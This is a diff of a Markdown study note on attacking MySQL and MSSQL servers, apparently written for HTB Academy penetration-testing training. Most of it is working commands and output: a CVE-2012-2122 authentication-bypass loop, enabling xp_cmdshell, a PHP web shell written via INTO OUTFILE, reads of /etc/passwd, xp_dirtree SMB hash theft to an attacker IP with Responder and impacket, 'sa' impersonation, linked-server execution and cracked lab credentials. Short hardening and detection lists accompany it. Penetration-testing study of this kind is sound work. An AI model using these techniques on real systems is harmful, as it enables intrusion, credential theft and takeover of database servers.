@@ -1,4 +1,4 @@
-# 🗄️ SQL Database Attacks (MySQL & MSSQL)
+# 🗄️ SQL Database Attacks
 
 ## 🎯 Overview
 
@@ -9,24 +9,27 @@ This document covers **exploitation techniques** against SQL databases (MySQL an
 ## 🏗️ SQL Attack Methodology
 
 ### Attack Chain Overview
+
 ```
 Service Discovery → Authentication Bypass → Database Enumeration → Data Extraction → Command Execution → Lateral Movement
 ```
 
 ### Key Attack Vectors
-- **Authentication Bypass** (Default credentials, timing attacks)
-- **Database Enumeration** (Tables, schemas, sensitive data)
-- **Command Execution** (xp_cmdshell, UDF functions)
-- **File Operations** (Read/write local files)
-- **Hash Stealing** (SMB integration attacks)
-- **Privilege Escalation** (User impersonation)
-- **Lateral Movement** (Linked servers)
 
----
+* **Authentication Bypass** (Default credentials, timing attacks)
+* **Database Enumeration** (Tables, schemas, sensitive data)
+* **Command Execution** (xp\_cmdshell, UDF functions)
+* **File Operations** (Read/write local files)
+* **Hash Stealing** (SMB integration attacks)
+* **Privilege Escalation** (User impersonation)
+* **Lateral Movement** (Linked servers)
+
+***
 
 ## 📍 Service Discovery & Analysis
 
 ### Default Ports & Scanning
+
 ```bash
 # MSSQL default ports
 # TCP/1433 (default), UDP/1434, TCP/2433 (hidden mode)
@@ -39,6 +42,7 @@ nmap -Pn -sV -sC -p1433,3306 10.10.10.125
 ```
 
 ### Banner Grabbing Example
+
 ```bash
 # Expected MSSQL output
 PORT     STATE SERVICE  VERSION
@@ -52,36 +56,41 @@ PORT     STATE SERVICE  VERSION
 ```
 
 ### Key Information to Extract
-- **Database Version** (vulnerability research)
-- **Authentication Mode** (Windows vs Mixed)
-- **Domain Information** (for privilege escalation)
-- **SSL Configuration** (encryption status)
-- **Service Account** details
 
----
+* **Database Version** (vulnerability research)
+* **Authentication Mode** (Windows vs Mixed)
+* **Domain Information** (for privilege escalation)
+* **SSL Configuration** (encryption status)
+* **Service Account** details
+
+***
 
 ## 🔐 Authentication Mechanisms & Bypass
 
 ### 1. MSSQL Authentication Types
 
 #### Windows Authentication Mode
-- **Integrated Security** with Windows/Active Directory
-- **Pre-authenticated** Windows users don't need additional credentials
-- **Domain-based** privilege management
+
+* **Integrated Security** with Windows/Active Directory
+* **Pre-authenticated** Windows users don't need additional credentials
+* **Domain-based** privilege management
 
 #### Mixed Mode Authentication
-- **Windows/AD accounts** + **SQL Server accounts**
-- **Username/password pairs** maintained within SQL Server
-- **Higher attack surface** due to dual authentication
+
+* **Windows/AD accounts** + **SQL Server accounts**
+* **Username/password pairs** maintained within SQL Server
+* **Higher attack surface** due to dual authentication
 
 ### 2. MySQL Authentication Methods
-- **Username/password** authentication
-- **Windows authentication** (plugin required)
-- **Socket-based** authentication
+
+* **Username/password** authentication
+* **Windows authentication** (plugin required)
+* **Socket-based** authentication
 
 ### 3. Historical Vulnerabilities
 
 #### CVE-2012-2122 - MySQL Timing Attack
+
 ```bash
 # MySQL 5.6.x authentication bypass
 # Repeatedly use same incorrect password
@@ -94,13 +103,14 @@ done
 # Eventually succeeds due to timing vulnerability
 ```
 
----
+***
 
 ## 🔓 Protocol Specific Attacks
 
 ### 1. Database Connection & Authentication
 
 #### MySQL Connection
+
 ```bash
 # Basic MySQL connection
 mysql -u julio -pPassword123 -h 10.129.20.13
@@ -112,6 +122,7 @@ Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
 ```
 
 #### MSSQL Connection Methods
+
 ```bash
 # Windows sqlcmd
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
@@ -124,6 +135,7 @@ mssqlclient.py -p 1433 julio@10.129.203.7
 ```
 
 #### Windows Authentication
+
 ```bash
 # Domain authentication
 sqsh -S 10.129.203.7 -U DOMAIN\\julio -P 'MyPassword!' -h
@@ -132,28 +144,31 @@ sqsh -S 10.129.203.7 -U DOMAIN\\julio -P 'MyPassword!' -h
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 ```
 
----
+***
 
 ## 🗄️ Database Enumeration & Data Extraction
 
 ### 1. Default System Databases
 
 #### MySQL System Schemas
-- **mysql** - System database with server information
-- **information_schema** - Database metadata access
-- **performance_schema** - Server execution monitoring
-- **sys** - Performance Schema interpretation objects
+
+* **mysql** - System database with server information
+* **information\_schema** - Database metadata access
+* **performance\_schema** - Server execution monitoring
+* **sys** - Performance Schema interpretation objects
 
 #### MSSQL System Databases
-- **master** - SQL Server instance information
-- **msdb** - SQL Server Agent usage
-- **model** - Template for new databases
-- **resource** - Read-only system objects
-- **tempdb** - Temporary objects storage
+
+* **master** - SQL Server instance information
+* **msdb** - SQL Server Agent usage
+* **model** - Template for new databases
+* **resource** - Read-only system objects
+* **tempdb** - Temporary objects storage
 
 ### 2. Database Enumeration Commands
 
 #### Show Databases
+
 ```sql
 -- MySQL
 SHOW DATABASES;
@@ -164,6 +179,7 @@ GO
 ```
 
 #### Select Database
+
 ```sql
 -- MySQL
 USE htbusers;
@@ -174,6 +190,7 @@ GO
 ```
 
 #### Show Tables
+
 ```sql
 -- MySQL
 SHOW TABLES;
@@ -184,6 +201,7 @@ GO
 ```
 
 #### Extract Table Data
+
 ```sql
 -- Universal SQL
 SELECT * FROM users;
@@ -198,13 +216,14 @@ SELECT * FROM users;
 +----+---------------+------------+---------------------+
 ```
 
----
+***
 
 ## 💻 Command Execution Techniques
 
 ### 1. MSSQL Command Execution
 
-#### xp_cmdshell Usage
+#### xp\_cmdshell Usage
+
 ```sql
 -- Execute system commands
 xp_cmdshell 'whoami'
@@ -217,7 +236,8 @@ nt service\mssql$sqlexpress
 NULL
 ```
 
-#### Enable xp_cmdshell
+#### Enable xp\_cmdshell
+
 ```sql
 -- Enable advanced options
 EXECUTE sp_configure 'show advanced options', 1
@@ -235,6 +255,7 @@ GO
 ### 2. MySQL Command Execution
 
 #### User Defined Functions (UDF)
+
 ```sql
 -- MySQL UDF for command execution
 -- Requires custom C/C++ UDF compilation
@@ -244,13 +265,14 @@ GO
 SELECT sys_exec('whoami');
 ```
 
----
+***
 
 ## 📂 File Operations
 
 ### 1. Write Local Files
 
 #### MySQL File Writing
+
 ```sql
 -- Write web shell to web directory
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
@@ -260,6 +282,7 @@ SHOW VARIABLES LIKE "secure_file_priv";
 ```
 
 #### MSSQL File Writing
+
 ```sql
 -- Enable Ole Automation Procedures
 sp_configure 'show advanced options', 1
@@ -285,6 +308,7 @@ GO
 ### 2. Read Local Files
 
 #### MSSQL File Reading
+
 ```sql
 -- Read system files
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
@@ -298,6 +322,7 @@ BulkColumn
 ```
 
 #### MySQL File Reading
+
 ```sql
 -- Read local files (requires appropriate privileges)
 SELECT LOAD_FILE("/etc/passwd");
@@ -310,20 +335,22 @@ SELECT LOAD_FILE("/etc/passwd");
 | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ```
 
----
+***
 
 ## 🕷️ Hash Stealing Attacks
 
 ### 1. MSSQL Service Hash Capture
 
-#### Using xp_dirtree
+#### Using xp\_dirtree
+
 ```sql
 -- Force SMB authentication to attacker
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
 GO
 ```
 
-#### Using xp_subdirs
+#### Using xp\_subdirs
+
 ```sql
 -- Alternative method
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
@@ -333,6 +360,7 @@ GO
 ### 2. Capture Setup
 
 #### Responder Setup
+
 ```bash
 # Start Responder to capture hashes
 sudo responder -I tun0
@@ -344,6 +372,7 @@ sudo responder -I tun0
 ```
 
 #### Impacket SMB Server
+
 ```bash
 # Alternative capture method
 sudo impacket-smbserver share ./ -smb2support
@@ -353,13 +382,14 @@ sudo impacket-smbserver share ./ -smb2support
 [*] User WINSRV02\mssqlsvc authenticated successfully
 ```
 
----
+***
 
 ## 👤 Privilege Escalation
 
 ### 1. User Impersonation
 
 #### Identify Impersonatable Users
+
 ```sql
 -- Find users we can impersonate
 SELECT distinct b.name
@@ -378,6 +408,7 @@ valentin
 ```
 
 #### Check Current Privileges
+
 ```sql
 -- Verify current user and role
 SELECT SYSTEM_USER
@@ -388,6 +419,7 @@ GO
 ```
 
 #### Impersonate Higher Privileged User
+
 ```sql
 -- Impersonate SA user
 EXECUTE AS LOGIN = 'sa'
@@ -401,13 +433,14 @@ GO
 REVERT
 ```
 
----
+***
 
 ## 🌐 Lateral Movement
 
 ### 1. Linked Servers
 
 #### Identify Linked Servers
+
 ```sql
 -- Find linked servers
 SELECT srvname, isremote FROM sysservers
@@ -423,6 +456,7 @@ DESKTOP-MFERMN4\SQLEXPRESS          1
 ```
 
 #### Execute Commands on Linked Servers
+
 ```sql
 -- Execute commands on remote SQL instance
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
@@ -433,12 +467,13 @@ GO
 DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019      sa_remote                      1
 ```
 
----
+***
 
 ## 📝 Skills Assessment Examples
 
 ### Example 1: Service Hash Capture
-**Task**: Capture MSSQL service hash using xp_dirtree
+
+**Task**: Capture MSSQL service hash using xp\_dirtree
 
 ```sql
 -- Force authentication to attacker machine
@@ -449,7 +484,8 @@ GO
 -- Answer: Service account hash captured
 ```
 
-### Example 2: Database Enumeration  
+### Example 2: Database Enumeration
+
 **Task**: Find flag in "flagDB" database
 
 ```sql
@@ -465,6 +501,7 @@ GO
 ```
 
 ### Example 3: Privilege Escalation
+
 **Task**: Escalate to sysadmin via impersonation
 
 ```sql
@@ -479,51 +516,54 @@ EXECUTE AS LOGIN = 'sa'
 -- Now have sysadmin privileges
 ```
 
----
+***
 
 ## 🛡️ Defense & Mitigation
 
 ### Database Security Hardening
-- **Disable unnecessary features** (xp_cmdshell, Ole Automation)
-- **Implement strong authentication**
-- **Use least privilege principles**
-- **Network segmentation** for database servers
-- **Regular security updates**
-- **Monitor file operations**
+
+* **Disable unnecessary features** (xp\_cmdshell, Ole Automation)
+* **Implement strong authentication**
+* **Use least privilege principles**
+* **Network segmentation** for database servers
+* **Regular security updates**
+* **Monitor file operations**
 
 ### Detection Strategies
-- **Monitor failed authentication attempts**
-- **Alert on xp_cmdshell usage**
-- **Track file read/write operations**
-- **Log impersonation activities**
-- **Monitor linked server queries**
-- **Detect SMB connection attempts**
 
----
+* **Monitor failed authentication attempts**
+* **Alert on xp\_cmdshell usage**
+* **Track file read/write operations**
+* **Log impersonation activities**
+* **Monitor linked server queries**
+* **Detect SMB connection attempts**
+
+***
 
 ## 🔗 Related Techniques
 
-- **[SMB Attacks](smb-attacks.md)** - Hash capture integration
-- **[Database Enumeration](../services/mysql-enumeration.md)** - Information gathering
-- **[Database Enumeration](../services/mssql-enumeration.md)** - MSSQL reconnaissance
-- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - Credential reuse
-- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain exploitation
+* [**SMB Attacks**](smb-attacks.md) - Hash capture integration
+* [**Database Enumeration**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/services/mysql-enumeration.md) - Information gathering
+* [**Database Enumeration**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/services/mssql-enumeration.md) - MSSQL reconnaissance
+* [**Pass the Hash**](../passwords-attacks/pass-the-hash.md) - Credential reuse
+* [**Active Directory Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/passwords-attacks/active-directory-attacks.md) - Domain exploitation
 
----
+***
 
 ## 📚 References
 
-- **HTB Academy** - Attacking Common Services Module
-- **Microsoft SQL Server Documentation** - Security best practices
-- **MySQL Security Documentation** - Hardening guidelines
-- **OWASP Database Security** - Common vulnerabilities
-- **CVE-2012-2122** - MySQL authentication bypass
+* **HTB Academy** - Attacking Common Services Module
+* **Microsoft SQL Server Documentation** - Security best practices
+* **MySQL Security Documentation** - Hardening guidelines
+* **OWASP Database Security** - Common vulnerabilities
+* **CVE-2012-2122** - MySQL authentication bypass
 
----
+***
 
 ## 🎯 HTB Academy Lab Scenarios
 
 ### Scenario 1: Initial Database Access
+
 ```bash
 # Target: 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02)
 # Credentials: htbdbuser:MSSQLAccess01!
@@ -540,9 +580,11 @@ Password: MSSQLAccess01!
 ```
 
 ### Scenario 2: MSSQL Service Hash Capture
+
 **Task**: Find password for "mssqlsvc" user via hash stealing
 
 #### Terminal 1 - Start SMB Server
+
 ```bash
 # Start impacket SMB server with SMBv2 support
 sudo impacket-smbserver share ./ -smb2support
@@ -555,6 +597,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ```
 
 #### Terminal 2 - Execute Hash Stealing Attack
+
 ```sql
 -- Connect to SQL server first
 sqlcmd -S 10.129.203.12 -U htbdbuser
@@ -567,6 +610,7 @@ sqlcmd -S 10.129.203.12 -U htbdbuser
 ```
 
 #### Captured Hash Output
+
 ```bash
 # SMB Server captures NTLMv2 hash:
 [*] Incoming connection (10.129.203.12,49676)
@@ -578,9 +622,11 @@ sqlcmd -S 10.129.203.12 -U htbdbuser
 ```
 
 ### Scenario 3: Flag Enumeration with Escalated Privileges
+
 **Task**: Enumerate "flagDB" database and extract flag
 
 #### Connect with mssqlsvc Account
+
 ```bash
 # Use cracked credentials: mssqlsvc:princess1
 sqlcmd -S 10.129.203.12 -U .\\mssqlsvc
@@ -591,6 +637,7 @@ Password: princess1
 ```
 
 #### Database and Table Enumeration
+
 ```sql
 -- Switch to flagDB database
 1> USE flagDB
@@ -609,6 +656,7 @@ tb_flag
 ```
 
 #### Flag Extraction
+
 ```sql
 -- Extract flag from tb_flag table
 1> SELECT * FROM tb_flag 
@@ -623,55 +671,60 @@ HTB{...}
 
 **Answer**: `HTB{...}`
 
----
+***
 
 ## 📋 SQL Attack Checklist
 
 ### Authentication Attacks
-- [ ] **Default credentials** - admin/admin, sa/sa, root/root
-- [ ] **Anonymous access** - NULL or empty password
-- [ ] **Weak passwords** - Dictionary attacks
-- [ ] **Windows authentication** - Domain credential abuse
 
-### Database Exploitation  
-- [ ] **System database access** - Information_schema, master, sys
-- [ ] **Sensitive data extraction** - User tables, configuration data
-- [ ] **Command execution** - xp_cmdshell, UDF functions
-- [ ] **File operations** - Read system files, write web shells
+* [ ] **Default credentials** - admin/admin, sa/sa, root/root
+* [ ] **Anonymous access** - NULL or empty password
+* [ ] **Weak passwords** - Dictionary attacks
+* [ ] **Windows authentication** - Domain credential abuse
+
+### Database Exploitation
+
+* [ ] **System database access** - Information\_schema, master, sys
+* [ ] **Sensitive data extraction** - User tables, configuration data
+* [ ] **Command execution** - xp\_cmdshell, UDF functions
+* [ ] **File operations** - Read system files, write web shells
 
 ### Post-Exploitation
-- [ ] **Hash capture** - xp_dirtree, xp_subdirs SMB attacks
-- [ ] **Privilege escalation** - User impersonation, role escalation
-- [ ] **Lateral movement** - Linked servers, network pivoting
-- [ ] **Persistence** - Backdoor accounts, scheduled jobs
 
----
+* [ ] **Hash capture** - xp\_dirtree, xp\_subdirs SMB attacks
+* [ ] **Privilege escalation** - User impersonation, role escalation
+* [ ] **Lateral movement** - Linked servers, network pivoting
+* [ ] **Persistence** - Backdoor accounts, scheduled jobs
+
+***
 
 ## 🛡️ Defense & Detection
 
 ### Security Hardening
-- **Disable xp_cmdshell** and dangerous stored procedures
-- **Implement least privilege** database access
-- **Use strong authentication** and password policies
-- **Network segmentation** for database servers
-- **Regular security updates** and patches
+
+* **Disable xp\_cmdshell** and dangerous stored procedures
+* **Implement least privilege** database access
+* **Use strong authentication** and password policies
+* **Network segmentation** for database servers
+* **Regular security updates** and patches
 
 ### Detection Strategies
-- **Monitor xp_cmdshell usage** and command execution
-- **Alert on file operations** (LOAD_FILE, INTO OUTFILE)
-- **Track authentication failures** and unusual login patterns
-- **Monitor SMB connections** from database servers
-- **Log impersonation activities** and privilege changes
 
----
+* **Monitor xp\_cmdshell usage** and command execution
+* **Alert on file operations** (LOAD\_FILE, INTO OUTFILE)
+* **Track authentication failures** and unusual login patterns
+* **Monitor SMB connections** from database servers
+* **Log impersonation activities** and privilege changes
+
+***
 
 ## 🔗 Related Techniques
 
-- **[SMB Attacks](smb-attacks.md)** - Hash capture integration
-- **[FTP Attacks](ftp-attacks.md)** - File transfer exploitation
-- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - Credential reuse
-- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain exploitation
+* [**SMB Attacks**](smb-attacks.md) - Hash capture integration
+* [**FTP Attacks**](ftp-attacks.md) - File transfer exploitation
+* [**Pass the Hash**](../passwords-attacks/pass-the-hash.md) - Credential reuse
+* [**Active Directory Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/passwords-attacks/active-directory-attacks.md) - Domain exploitation
 
----
+***
 
-*This document provides comprehensive SQL database attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 
+_This document provides comprehensive SQL database attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment._
